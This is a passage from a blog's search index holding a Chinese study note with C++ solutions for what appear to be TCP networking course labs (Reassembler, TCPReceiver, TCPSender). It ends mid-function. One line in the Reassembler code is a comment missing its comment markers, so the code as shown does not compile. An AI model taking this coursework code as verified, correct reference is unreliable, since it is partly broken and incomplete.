<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/07/16/Resembler/"/>
    <url>/emocoder/2023/07/16/Resembler/</url>
    
    <content type="html"><![CDATA[<h2 id="resembler">Resembler</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs C++"><br><span class="hljs-comment">// 当前进党设置了closed标识位且待重组的字节为0</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Reassembler::is_closed</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> closed_ &amp;&amp; <span class="hljs-built_in">bytes_pending</span>() == <span class="hljs-number">0</span>; &#125;   <br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Reassembler::insert</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> first_index, string data, <span class="hljs-type">bool</span> is_last_substring, Writer &amp;output)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (is_last_substring) &#123;<br>        closed_ = <span class="hljs-literal">true</span>;<br>    &#125;<br>待处理的超出可容纳范围 || Data have been transferred || data为空 || 可用capacity为<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> (first_index &gt;= unassembled_index_ + output.<span class="hljs-built_in">available_capacity</span>() || <span class="hljs-comment">/* Out of bound */</span><br>        first_index + data.<span class="hljs-built_in">length</span>() - <span class="hljs-number">1</span> &lt; unassembled_index_ ||            <span class="hljs-comment">/* Data have been transferred */</span><br>        data.<span class="hljs-built_in">empty</span>() || output.<span class="hljs-built_in">available_capacity</span>() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_closed</span>()) &#123;<br>            output.<span class="hljs-built_in">close</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> cap = output.<span class="hljs-built_in">available_capacity</span>();<br>    <span class="hljs-comment">// new_index actually distinguish where the current data start, the start index</span><br>    <span class="hljs-type">uint64_t</span> new_index = first_index;<br>    <br>    <span class="hljs-comment">// Data needs to fit the capability limitation</span><br>    <span class="hljs-keyword">if</span> (first_index &lt;= unassembled_index_) &#123;<br>        <span class="hljs-comment">// 有重复</span><br>        new_index = unassembled_index_;<br>        <span class="hljs-comment">// overlapped_length = 70 - 60;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> overlapped_length = unassembled_index_ - first_index;<br>        <span class="hljs-comment">// substr(10, 20 - 10); data.size = [60, 80] =&gt; [0, 20]</span><br>        data = data.<span class="hljs-built_in">substr</span>(overlapped_length, <span class="hljs-built_in">min</span>(data.<span class="hljs-built_in">size</span>() - overlapped_length, cap));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 没有重复</span><br>        <span class="hljs-comment">// get 全部数据or可容纳的部分</span><br>        data = data.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">min</span>(data.<span class="hljs-built_in">size</span>(), cap));<br>        <span class="hljs-keyword">if</span> (first_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &gt; unassembled_index_ + cap - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// </span><br>            data = data.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, unassembled_index_ + cap - first_index);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 主要是处理 unassembled_substrings_ 和</span><br>    <span class="hljs-comment">// 获取 &gt;=new_index的最小索引</span><br>    <span class="hljs-keyword">auto</span> rear_iter = unassembled_substrings_.<span class="hljs-built_in">lower_bound</span>(new_index);<br>    <span class="hljs-keyword">while</span> (rear_iter != unassembled_substrings_.<span class="hljs-built_in">end</span>()) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[rear_index, rear_data] = *rear_iter;<br>        <span class="hljs-comment">// 和rear_index没有重叠</span><br>        <span class="hljs-keyword">if</span> (new_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &lt; rear_index) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125; <span class="hljs-comment">// No overlap conflict</span><br>        <br>        <span class="hljs-comment">// 否则就是有重叠</span><br>        <span class="hljs-type">uint64_t</span> rear_overlapped_length = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (new_index + data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &lt; rear_index + rear_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// the last index of current data less than counterpart of the rear_data</span><br>            <span class="hljs-comment">// denote that current: [. [  ]. ], then cut from [new_index, new_index + overlap_len]，这种case新的或者旧的应该包含重叠部分，这里采用的是旧的包含重叠部分，新的不包含重叠部分</span><br>            rear_overlapped_length = new_index + data.<span class="hljs-built_in">size</span>() - rear_index;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// else current: [. [  ] ]. 这种case旧的substring就不应该需要了，新的替换</span><br>            rear_overlapped_length = rear_data.<span class="hljs-built_in">size</span>();<br>        &#125;<br>        <span class="hljs-comment">// Prepare for next rear early, because the data may be erased afterwards.</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> next_rear = rear_index + rear_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; <span class="hljs-comment">// last index of rear_data</span><br>        <span class="hljs-keyword">if</span> (rear_overlapped_length == rear_data.<span class="hljs-built_in">size</span>()) &#123;<br>          <span class="hljs-comment">// 走了上面的else，就会走这里</span><br>            unassembled_bytes_ -= rear_data.<span class="hljs-built_in">size</span>();<br>            unassembled_substrings_.<span class="hljs-built_in">erase</span>(rear_index); <span class="hljs-comment">// 抹除旧的</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 走了上面的if，就会走这里</span><br>            <span class="hljs-comment">// We don&#x27;t combine current data and rear data.</span><br>            <span class="hljs-comment">// Erase the overlapped part in current data is more efficient.</span><br>            data.<span class="hljs-built_in">erase</span>(data.<span class="hljs-built_in">end</span>() - <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;(rear_overlapped_length), data.<span class="hljs-built_in">end</span>());<br>        &#125;<br>        <span class="hljs-comment">// 寻找下一个 &gt;= next_rear的substring</span><br>        rear_iter = unassembled_substrings_.<span class="hljs-built_in">lower_bound</span>(next_rear);<br>    &#125;<br>    <br>     <span class="hljs-comment">// 同样地主要是处理 unassembled_substrings_ 和最大索引</span><br>     <span class="hljs-comment">// if the current substring behind the unassembled_index_</span><br>     <span class="hljs-keyword">if</span> (first_index &gt; unassembled_index_) &#123;<br>        <span class="hljs-comment">// 获取&gt;new_index的最小值</span><br>        <span class="hljs-keyword">auto</span> front_iter = unassembled_substrings_.<span class="hljs-built_in">upper_bound</span>(new_index);<br>        <span class="hljs-keyword">if</span> (front_iter != unassembled_substrings_.<span class="hljs-built_in">begin</span>()) &#123;<br>            <span class="hljs-comment">// 递减front_iter</span><br>            front_iter--;<br>            <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;[front_index, front_data] = *front_iter;<br>            <span class="hljs-comment">// if first_index, ]</span><br>            <span class="hljs-keyword">if</span> (front_index + front_data.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span> &gt;= first_index) &#123;<br>                <span class="hljs-type">uint64_t</span> overlapped_length = <span class="hljs-number">0</span>;<br>                <span class="hljs-comment">// if  ] last_index</span><br>                <span class="hljs-keyword">if</span> (front_index + front_data.<span class="hljs-built_in">size</span>() &lt;= first_index + data.<span class="hljs-built_in">size</span>()) &#123;<br>                   <span class="hljs-comment">// 一次性把之前的全部delete了，所以不需要遍历</span><br>                    overlapped_length = front_index + front_data.<span class="hljs-built_in">size</span>() - first_index;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// if  last_index  ]</span><br>                    overlapped_length = data.<span class="hljs-built_in">size</span>();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (overlapped_length == front_data.<span class="hljs-built_in">size</span>()) &#123;<br>                    unassembled_bytes_ -= front_data.<span class="hljs-built_in">size</span>();<br>                    unassembled_substrings_.<span class="hljs-built_in">erase</span>(front_index);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    data.<span class="hljs-built_in">erase</span>(data.<span class="hljs-built_in">begin</span>(), data.<span class="hljs-built_in">begin</span>() + <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int64_t</span>&gt;(overlapped_length));<br>                    <span class="hljs-comment">// Don&#x27;t forget to update the inserted location</span><br>                    new_index = first_index + overlapped_length;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <br>    <span class="hljs-comment">// If the processed data is empty, no need to insert it.</span><br>    <span class="hljs-keyword">if</span> (data.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br>        unassembled_bytes_ += data.<span class="hljs-built_in">size</span>();<br>        unassembled_substrings_.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(new_index, std::<span class="hljs-built_in">move</span>(data)));<br>    &#125;<br><br> <span class="hljs-comment">// 从unassembled_strings中取出合理的（这里的合理指有序取，所以顺序遍历从unassembled_strings中取和上一层未组装的地方）插入发送缓冲区</span><br>   <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = unassembled_substrings_.<span class="hljs-built_in">begin</span>(); iter != unassembled_substrings_.<span class="hljs-built_in">end</span>();) &#123;<br>        <span class="hljs-keyword">auto</span> &amp;[sub_index, sub_data] = *iter;<br>        <span class="hljs-keyword">if</span> (sub_index == unassembled_index_) &#123;<br>          <span class="hljs-comment">// 找到了</span><br>            <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> prev_bytes_pushed = output.<span class="hljs-built_in">bytes_pushed</span>();<br>            output.<span class="hljs-built_in">push</span>(sub_data);<br>            <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> bytes_pushed = output.<span class="hljs-built_in">bytes_pushed</span>();<br>            <span class="hljs-comment">// 但是可能装不下</span><br>            <span class="hljs-comment">// which case can go this if condition path ? when the Writer has no available space to store data.</span><br>            <span class="hljs-keyword">if</span> (bytes_pushed != prev_bytes_pushed + sub_data.<span class="hljs-built_in">size</span>()) &#123;<br>                <span class="hljs-comment">// Cannot push all data, we need to reserve the un-pushed part.</span><br>                <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> pushed_length = bytes_pushed - prev_bytes_pushed;<br>               <span class="hljs-comment">// 已经装进去的 </span><br>                unassembled_index_ += pushed_length;<br>               <span class="hljs-comment">// 未装进去的</span><br>                unassembled_bytes_ -= pushed_length;<br>               <span class="hljs-comment">// 把没有装进去的放回缓存区（unassembled_substrings_）</span><br>                unassembled_substrings_.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(unassembled_index_, sub_data.<span class="hljs-built_in">substr</span>(pushed_length)));<br>                <span class="hljs-comment">// Don&#x27;t forget to remove the previous incompletely transferred data</span><br>                unassembled_substrings_.<span class="hljs-built_in">erase</span>(sub_index);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            unassembled_index_ += sub_data.<span class="hljs-built_in">size</span>();<br>            unassembled_bytes_ -= sub_data.<span class="hljs-built_in">size</span>();<br>            unassembled_substrings_.<span class="hljs-built_in">erase</span>(sub_index);<br>            iter = unassembled_substrings_.<span class="hljs-built_in">find</span>(unassembled_index_);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// No need to do more. Data has been discontinuous.</span><br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_closed</span>()) &#123;<br>        <span class="hljs-comment">// if it is the last substring and bytes_pending === 0, then close</span><br>        output.<span class="hljs-built_in">close</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="tcpreceiver">TCPReceiver</h2><p>这一节最好合上一节来看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_receiver.hh&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPReceiver::receive</span><span class="hljs-params">(TCPSenderMessage message, Reassembler &amp;reassembler, Writer &amp;inbound_stream)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// 没有设置SYN，此时不应该接受数据</span><br>    <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>      <span class="hljs-comment">// 且当前报道文也不是SYN的</span><br>        <span class="hljs-keyword">if</span> (!message.SYN) &#123;<br>            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// drop all data if SYN isn&#x27;t received</span><br>        &#125;<br>        <span class="hljs-comment">// 当前报道文是SYN的，设置ISN：随机的32位数字</span><br>        isn_ = message.seqno; <span class="hljs-comment">// FIN occupied one seqno</span><br>        set_syn_ = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 设置SYN标志位</span><br>    &#125;<br><br>    <span class="hljs-comment">// inbound_stream.bytes_pushed()即unassembled_index, + 1即为下一个期待接入的序号（first_index），需要基于ISN转为abs_seqno =&gt; stram_index</span><br>    <span class="hljs-comment">// stream_index = abs_seqno - 1 + SYN</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> checkpoint = inbound_stream.<span class="hljs-built_in">bytes_pushed</span>() + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> abs_seqno = message.seqno.<span class="hljs-built_in">unwrap</span>(isn_, checkpoint);<br>    <span class="hljs-comment">// unwrap function starts from isn_, which occupies one seqno.</span><br>    <span class="hljs-comment">// We calculate one index more so we need to minus it.</span><br>    <span class="hljs-comment">// But if SYN exists in this message, compensation is needed.</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> stream_index = abs_seqno - <span class="hljs-number">1</span> + message.SYN;<br>    <span class="hljs-comment">// 调用上一节实现的insert方法</span><br>    reassembler.<span class="hljs-built_in">insert</span>(stream_index, message.payload.<span class="hljs-built_in">release</span>(), message.FIN, inbound_stream);<br>&#125;<br><br><span class="hljs-comment">// receive调用结束了之后调用</span><br><span class="hljs-function">TCPReceiverMessage <span class="hljs-title">TCPReceiver::send</span><span class="hljs-params">(<span class="hljs-type">const</span> Writer &amp;inbound_stream)</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>    TCPReceiverMessage recv_msg &#123;&#125;;<br><br>    <span class="hljs-comment">// ws为接受方的缓存里的available_capacity，</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint16_t</span> window_size<br>        = inbound_stream.<span class="hljs-built_in">available_capacity</span>() &gt; UINT16_MAX ? UINT16_MAX : inbound_stream.<span class="hljs-built_in">available_capacity</span>();<br>    <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>        <span class="hljs-keyword">return</span> &#123;std::optional&lt;Wrap32&gt; &#123;&#125;, window_size&#125;;<br>    &#125;<br>    <span class="hljs-comment">// add one ISN(SYN) length，ackno为下一个期待的序列号</span><br>    <span class="hljs-type">uint64_t</span> abs_ackno_offset = inbound_stream.<span class="hljs-built_in">bytes_pushed</span>() + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (inbound_stream.<span class="hljs-built_in">is_closed</span>()) &#123;<br>        abs_ackno_offset++; <span class="hljs-comment">// add one FIN</span><br>    &#125;<br>    recv_msg.ackno = isn_ + abs_ackno_offset;<br>    recv_msg.window_size = window_size;<br><br>    <span class="hljs-keyword">return</span> recv_msg;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>绝对序列号是为了不让别人轻易猜到，但是为什么用32位？</li><li>为什么<code>const uint64_t stream_index = abs_seqno - 1 + message.SYN;</code></li></ul><h2 id="tcpsender">TCPSender</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_sender.hh&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tcp_config.hh&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;random&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">/* TCPSender constructor (uses a random ISN if none given) */</span><br>TCPSender::<span class="hljs-built_in">TCPSender</span>(<span class="hljs-type">uint64_t</span> initial_RTO_ms, optional&lt;Wrap32&gt; fixed_isn)<br>    : <span class="hljs-built_in">isn_</span>(fixed_isn.<span class="hljs-built_in">value_or</span>(Wrap32 &#123;<span class="hljs-built_in">random_device</span>()()&#125;)), <span class="hljs-built_in">initial_RTO_ms_</span>(initial_RTO_ms)<br>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">TCPSender::sequence_numbers_in_flight</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> outstanding_seqno_; &#125;<br><br><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">TCPSender::consecutive_retransmissions</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> consecutive_retransmission_times_; &#125;<br><br><span class="hljs-function">optional&lt;TCPSenderMessage&gt; <span class="hljs-title">TCPSender::maybe_send</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!segments_out_.<span class="hljs-built_in">empty</span>() &amp;&amp; set_syn_) &#123;<br>        TCPSenderMessage segment = std::<span class="hljs-built_in">move</span>(segments_out_.<span class="hljs-built_in">front</span>());<br>        segments_out_.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> segment;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullopt</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::push</span><span class="hljs-params">(Reader &amp;outbound_stream)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// ws默认从receiver的返回结果中取，娶不到默认为1</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> curr_window_size = window_size_ ? window_size_ : <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 填充</span><br>    <span class="hljs-keyword">while</span> (curr_window_size &gt; outstanding_seqno_) &#123;<br>        TCPSenderMessage msg;<br><br>        <span class="hljs-keyword">if</span> (!set_syn_) &#123;<br>            msg.SYN = <span class="hljs-literal">true</span>;<br>            set_syn_ = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        msg.seqno = <span class="hljs-built_in">get_next_seqno</span>();<br>        <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> payload_size<br>            = <span class="hljs-built_in">min</span>(TCPConfig::MAX_PAYLOAD_SIZE, curr_window_size - outstanding_seqno_ - msg.SYN);<br>        std::string payload = std::<span class="hljs-built_in">string</span>(outbound_stream.<span class="hljs-built_in">peek</span>()).<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, payload_size);<br>        outbound_stream.<span class="hljs-built_in">pop</span>(payload_size);<br><br>        <span class="hljs-keyword">if</span> (!set_fin_ &amp;&amp; outbound_stream.<span class="hljs-built_in">is_finished</span>()<br>            &amp;&amp; payload.<span class="hljs-built_in">size</span>() + outstanding_seqno_ + msg.SYN &lt; curr_window_size) &#123;<br>            msg.FIN = <span class="hljs-literal">true</span>;<br>            set_fin_ = <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        msg.payload = <span class="hljs-built_in">Buffer</span>(std::<span class="hljs-built_in">move</span>(payload));<br><br>        <span class="hljs-comment">// no data, stop sending</span><br>        <span class="hljs-keyword">if</span> (msg.<span class="hljs-built_in">sequence_length</span>() == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// no outstanding segments, restart timer</span><br>        <span class="hljs-keyword">if</span> (outstanding_seg_.<span class="hljs-built_in">empty</span>()) &#123;<br>            RTO_timeout_ = initial_RTO_ms_;<br>            timer_ = <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 还没发送，放入未确认缓存</span><br>        segments_out_.<span class="hljs-built_in">push</span>(msg);<br><br>      <span class="hljs-comment">// 当然，未确认的序列号也要相应增加</span><br>        outstanding_seqno_ += msg.<span class="hljs-built_in">sequence_length</span>();<br>        <span class="hljs-comment">// &#123; next_abs_seqno_: msg &#125;</span><br>      outstanding_seg_.<span class="hljs-built_in">insert</span>(std::<span class="hljs-built_in">make_pair</span>(next_abs_seqno_, msg));<br>        <span class="hljs-comment">// 增加</span><br>      next_abs_seqno_ += msg.<span class="hljs-built_in">sequence_length</span>();<br><br>       <span class="hljs-comment">// 如果是FIN报道文，直接结束</span><br>        <span class="hljs-keyword">if</span> (msg.FIN) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">TCPSenderMessage <span class="hljs-title">TCPSender::send_empty_message</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span><br><span class="hljs-function"></span>&#123;<br>    TCPSenderMessage segment;<br>    segment.seqno = <span class="hljs-built_in">get_next_seqno</span>();<br><br>    <span class="hljs-keyword">return</span> segment;<br>&#125;<br><br><span class="hljs-comment">// receive =&gt; push =&gt; send</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TCPSender::receive</span><span class="hljs-params">(<span class="hljs-type">const</span> TCPReceiverMessage &amp;msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> 